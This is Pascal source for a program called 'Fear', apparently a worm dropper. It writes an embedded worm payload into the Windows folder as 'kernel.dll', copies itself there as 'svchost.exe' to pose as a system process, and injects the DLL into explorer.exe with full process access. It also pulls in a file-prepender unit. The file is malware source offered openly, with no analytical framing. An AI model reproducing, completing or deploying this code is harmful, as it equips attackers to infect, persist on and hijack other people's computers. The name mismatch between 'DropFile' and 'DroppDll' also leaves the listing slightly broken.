   PROGRAM Fear;

   USES
     Windows,
     TlHelp32,
     afxCodeHook,
     AclUtils IN 'ACLUnits\ACLUTILS.PAS',
     Prepender in 'prepender.pas';

   {$R icon.res}
   {$I RESOURCES\FEAR_DLL.INI}

   VAR
     PID     : DWORD;
     Process : DWORD;
     F       : FILE Of Byte;
     I       : WORD;

   FUNCTION FileExists(pszPath:STRING) : BOOL; STDCALL; EXTERNAL 'shlwapi.dll' name 'PathFileExistsA';

   FUNCTION WinPath : STRING;
   VAR
     PWindowsDir : ARRAY [0..255] OF Char;
   BEGIN
     GetWindowsDirectory(PWindowsDir,255);
     WinPath:=STRING(PWindowsDir)+'\';
   END;

   FUNCTION GetProcessID(sProcName:STRING) : Integer;
   VAR
     hProcSnap : THandle;
     pe32      : TProcessEntry32;
   BEGIN
     Result:=-1;
     hProcSnap:=CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
     IF hProcSnap=INVALID_HANDLE_VALUE THEN Exit;
     pe32.dwSize:=SizeOf(ProcessEntry32);
     IF Process32First(hProcSnap,pe32)=True THEN
     WHILE Process32Next(hProcSnap,pe32)=True DO IF pos(sProcName,UpperCase(pe32.szExeFile))>0 THEN Result:=pe32.th32ProcessID;
   END;

   PROCEDURE DroppDll;
   VAR
     F : File;
   BEGIN
     AssignFile(F,WinPath+'kernel.dll');
     Rewrite(F,1);
     BlockWrite(F,Worm[1],SizeOf(Worm));
     CloseFile(F);
   END;

   BEGIN
     DropFile;
     AssignFile(F,WinPath+'kernel.dll');
     FileMode:=2;
     {$I-}
     Reset(F);
     {$I+}
     I:=IOResult;
     IF I=0 THEN CloseFile(F);
     IF(I=0)or(NOT FileExists(WinPath+'kernel.dll'))THEN BEGIN
       DroppDll;
       IF NOT FileExists(WinPath+'svchost.exe') THEN CopyFile(pChar(paramstr(0)),pChar(WinPath+'svchost.exe'),False);
       PID:=GetProcessID('EXPLORER.EXE');
       Process:=OpenProcess(PROCESS_ALL_ACCESS,False,PID);
       InjectLibrary(Process,'kernel.dll');
     END;
   {  PID:=GetProcessID('WN.EXE');
     Process:=OpenProcess(PROCESS_ALL_ACCESS,False,PID);
     InjectLibrary(Process,'f:\i-worm.fear\fear_dll.dll');  }
   END.
